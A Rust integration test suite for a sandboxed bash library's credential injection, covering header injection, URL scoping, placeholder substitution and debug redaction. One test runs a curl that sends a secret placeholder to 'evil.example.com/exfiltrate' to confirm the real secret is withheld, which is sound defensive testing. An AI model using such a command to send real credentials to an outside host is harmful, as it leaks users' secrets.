//! Credential Injection Integration Tests
//!
//! Tests for generic credential injection (specs/019-credential-injection.md).
//!
//! Tests verify:
//! - Injection mode: headers added transparently
//! - Placeholder mode: env var placeholder replaced with real credential
//! - Overwrite semantics: injected headers replace script-set headers
//! - URL scoping: credentials only injected for matching patterns
//! - Security: placeholder not replaced for non-matching hosts
//! - Multiple credentials: different creds for different hosts
//!
//! Run with: `cargo test --features http_client credential_injection`

#![cfg(feature = "http_client")]

use bashkit::hooks::{HookAction, HttpRequestEvent};
use bashkit::{Bash, Credential, NetworkAllowlist};

// =============================================================================
// 1. INJECTION MODE
// =============================================================================

mod injection {
    use super::*;

    /// Injection mode adds Authorization header transparently.
    #[tokio::test]
    async fn adds_bearer_header() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential(
                "https://api.github.com",
                Credential::bearer("ghp_test_token"),
            )
            // Capture the request after credential injection
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                // Cancel to avoid actual network call
                HookAction::Cancel("captured".into())
            }))
            .build();

        let _result = bash
            .exec("curl -s https://api.github.com/repos/foo/bar")
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 1);
        let (url, headers) = &requests[0];
        assert_eq!(url, "https://api.github.com/repos/foo/bar");

        let auth_header = headers
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case("authorization"));
        assert!(
            auth_header.is_some(),
            "Authorization header should be present"
        );
        assert_eq!(auth_header.unwrap().1, "Bearer ghp_test_token");
    }

    /// Injection mode adds custom header.
    #[tokio::test]
    async fn adds_custom_header() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential(
                "https://api.stripe.com",
                Credential::header("X-Api-Key", "sk_test_123"),
            )
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                HookAction::Cancel("captured".into())
            }))
            .build();

        let _result = bash
            .exec("curl -s https://api.stripe.com/v1/charges")
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 1);
        let api_key = requests[0].1.iter().find(|(name, _)| name == "X-Api-Key");
        assert!(api_key.is_some());
        assert_eq!(api_key.unwrap().1, "sk_test_123");
    }

    /// Injection mode adds multiple headers.
    #[tokio::test]
    async fn adds_multiple_headers() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential(
                "https://api.example.com",
                Credential::headers(vec![
                    ("X-Api-Key".into(), "key123".into()),
                    ("X-Api-Secret".into(), "secret456".into()),
                ]),
            )
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                HookAction::Cancel("captured".into())
            }))
            .build();

        let _result = bash
            .exec("curl -s https://api.example.com/data")
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 1);
        let headers = &requests[0].1;
        assert!(
            headers
                .iter()
                .any(|(n, v)| n == "X-Api-Key" && v == "key123")
        );
        assert!(
            headers
                .iter()
                .any(|(n, v)| n == "X-Api-Secret" && v == "secret456")
        );
    }
}

// =============================================================================
// 2. OVERWRITE SEMANTICS
// =============================================================================

mod overwrite {
    use super::*;

    /// Script-set Authorization header is overwritten by credential policy.
    #[tokio::test]
    async fn overwrites_script_authorization_header() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential("https://api.github.com", Credential::bearer("real_token"))
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                HookAction::Cancel("captured".into())
            }))
            .build();

        // Script tries to set its own Authorization header
        let _result = bash
            .exec(
                r#"curl -s -H "Authorization: Bearer attacker_token" https://api.github.com/repos/foo/bar"#,
            )
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 1);
        let auth_headers: Vec<_> = requests[0]
            .1
            .iter()
            .filter(|(name, _)| name.eq_ignore_ascii_case("authorization"))
            .collect();
        // Should be exactly one Authorization header with the real token
        assert_eq!(auth_headers.len(), 1);
        assert_eq!(auth_headers[0].1, "Bearer real_token");
    }
}

// =============================================================================
// 3. URL SCOPING
// =============================================================================

mod scoping {
    use super::*;

    /// Credentials are not injected for non-matching URLs.
    #[tokio::test]
    async fn no_injection_for_non_matching_url() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential("https://api.github.com", Credential::bearer("ghp_token"))
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                HookAction::Cancel("captured".into())
            }))
            .build();

        // Request to a different host — should NOT get credentials
        let _result = bash
            .exec("curl -s https://other.example.com/data")
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 1);
        let auth_header = requests[0]
            .1
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case("authorization"));
        assert!(
            auth_header.is_none(),
            "Authorization should NOT be present for non-matching URL"
        );
    }

    /// Path-scoped credentials only match the correct path prefix.
    #[tokio::test]
    async fn path_scoped_credential() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential(
                "https://api.example.com/v1/",
                Credential::bearer("v1_token"),
            )
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                HookAction::Cancel("captured".into())
            }))
            .build();

        // /v1/ path — should get credentials
        let _result = bash
            .exec("curl -s https://api.example.com/v1/users")
            .await
            .unwrap();
        // /v2/ path — should NOT get credentials
        let _result = bash
            .exec("curl -s https://api.example.com/v2/users")
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 2);

        // First request (/v1/) should have auth
        let auth_v1 = requests[0]
            .1
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case("authorization"));
        assert!(auth_v1.is_some(), "/v1/ should have Authorization");

        // Second request (/v2/) should NOT have auth
        let auth_v2 = requests[1]
            .1
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case("authorization"));
        assert!(auth_v2.is_none(), "/v2/ should NOT have Authorization");
    }

    /// Multiple credentials for different hosts.
    #[tokio::test]
    async fn multiple_hosts() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential("https://api.github.com", Credential::bearer("gh_token"))
            .credential(
                "https://api.openai.com",
                Credential::header("X-Api-Key", "openai_key"),
            )
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                HookAction::Cancel("captured".into())
            }))
            .build();

        let _result = bash
            .exec("curl -s https://api.github.com/repos")
            .await
            .unwrap();
        let _result = bash
            .exec("curl -s https://api.openai.com/v1/models")
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 2);

        // GitHub gets Bearer token
        let gh_auth = requests[0]
            .1
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case("authorization"));
        assert!(gh_auth.is_some());
        assert_eq!(gh_auth.unwrap().1, "Bearer gh_token");

        // OpenAI gets X-Api-Key
        let oai_key = requests[1].1.iter().find(|(name, _)| name == "X-Api-Key");
        assert!(oai_key.is_some());
        assert_eq!(oai_key.unwrap().1, "openai_key");
    }
}

// =============================================================================
// 4. PLACEHOLDER MODE
// =============================================================================

mod placeholder {
    use super::*;

    /// Placeholder env var is set and visible to scripts.
    #[tokio::test]
    async fn env_var_contains_placeholder() {
        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential_placeholder(
                "MY_API_KEY",
                "https://api.example.com",
                Credential::bearer("real_secret"),
            )
            .build();

        let result = bash.exec("echo $MY_API_KEY").await.unwrap();
        let value = result.stdout.trim();
        assert!(
            value.starts_with("bk_placeholder_"),
            "env var should contain placeholder, got: {}",
            value
        );
        assert!(
            !value.contains("real_secret"),
            "env var should NOT contain real secret"
        );
    }

    /// Placeholder is replaced with real credential in outbound headers.
    #[tokio::test]
    async fn placeholder_replaced_in_header() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential_placeholder(
                "MY_TOKEN",
                "https://api.example.com",
                Credential::bearer("real_secret"),
            )
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                HookAction::Cancel("captured".into())
            }))
            .build();

        let _result = bash
            .exec(r#"curl -s -H "Authorization: Bearer $MY_TOKEN" https://api.example.com/data"#)
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 1);
        let auth_header = requests[0]
            .1
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case("authorization"));
        assert!(auth_header.is_some(), "Authorization header should exist");
        assert_eq!(
            auth_header.unwrap().1,
            "Bearer real_secret",
            "Placeholder should be replaced with real value"
        );
    }

    /// Placeholder is NOT replaced when sent to a non-matching host.
    #[tokio::test]
    async fn placeholder_not_replaced_for_wrong_host() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            .credential_placeholder(
                "SECRET_KEY",
                "https://api.trusted.com",
                Credential::bearer("real_secret"),
            )
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                HookAction::Cancel("captured".into())
            }))
            .build();

        // Send to an untrusted host — placeholder should remain as-is
        let _result = bash
            .exec(
                r#"curl -s -H "Authorization: Bearer $SECRET_KEY" https://evil.example.com/exfiltrate"#,
            )
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 1);
        let auth_header = requests[0]
            .1
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case("authorization"));
        assert!(auth_header.is_some());
        // The placeholder should NOT have been replaced
        assert!(
            auth_header.unwrap().1.contains("bk_placeholder_"),
            "Placeholder should NOT be replaced for wrong host"
        );
        assert!(
            !auth_header.unwrap().1.contains("real_secret"),
            "Real secret should NOT appear for wrong host"
        );
    }
}

// =============================================================================
// 5. MIXED MODES
// =============================================================================

mod mixed {
    use super::*;

    /// Injection and placeholder modes can be used together.
    #[tokio::test]
    async fn injection_and_placeholder_together() {
        let captured = std::sync::Arc::new(std::sync::Mutex::new(Vec::<(
            String,
            Vec<(String, String)>,
        )>::new()));
        let captured_clone = captured.clone();

        let mut bash = Bash::builder()
            .network(NetworkAllowlist::allow_all())
            // Injection mode for GitHub
            .credential("https://api.github.com", Credential::bearer("gh_token"))
            // Placeholder mode for OpenAI
            .credential_placeholder(
                "OPENAI_KEY",
                "https://api.openai.com",
                Credential::bearer("sk_real"),
            )
            .before_http(Box::new(move |req: HttpRequestEvent| {
                captured_clone
                    .lock()
                    .unwrap()
                    .push((req.url.clone(), req.headers.clone()));
                HookAction::Cancel("captured".into())
            }))
            .build();

        // GitHub: injection mode — no header needed in script
        let _result = bash
            .exec("curl -s https://api.github.com/repos")
            .await
            .unwrap();
        // OpenAI: placeholder mode — script uses $OPENAI_KEY
        let _result = bash
            .exec(
                r#"curl -s -H "Authorization: Bearer $OPENAI_KEY" https://api.openai.com/v1/models"#,
            )
            .await
            .unwrap();

        let requests = captured.lock().unwrap();
        assert_eq!(requests.len(), 2);

        // GitHub should have Bearer gh_token (injected)
        let gh_auth = requests[0]
            .1
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case("authorization"));
        assert_eq!(gh_auth.unwrap().1, "Bearer gh_token");

        // OpenAI should have Bearer sk_real (placeholder replaced)
        let oai_auth = requests[1]
            .1
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case("authorization"));
        assert_eq!(oai_auth.unwrap().1, "Bearer sk_real");
    }
}

// =============================================================================
// 6. CREDENTIAL DEBUG REDACTION
// =============================================================================

mod redaction {
    use super::*;

    /// Debug output of Credential never shows secret values.
    #[test]
    fn credential_debug_redacts_bearer() {
        let cred = Credential::bearer("super_secret_token");
        let debug = format!("{:?}", cred);
        assert!(!debug.contains("super_secret_token"));
        assert!(debug.contains("[REDACTED]"));
    }

    /// Debug output of Credential::Header redacts the value.
    #[test]
    fn credential_debug_redacts_header_value() {
        let cred = Credential::header("X-Api-Key", "secret_key_value");
        let debug = format!("{:?}", cred);
        assert!(!debug.contains("secret_key_value"));
        assert!(debug.contains("[REDACTED]"));
        // Name should be visible
        assert!(debug.contains("X-Api-Key"));
    }
}
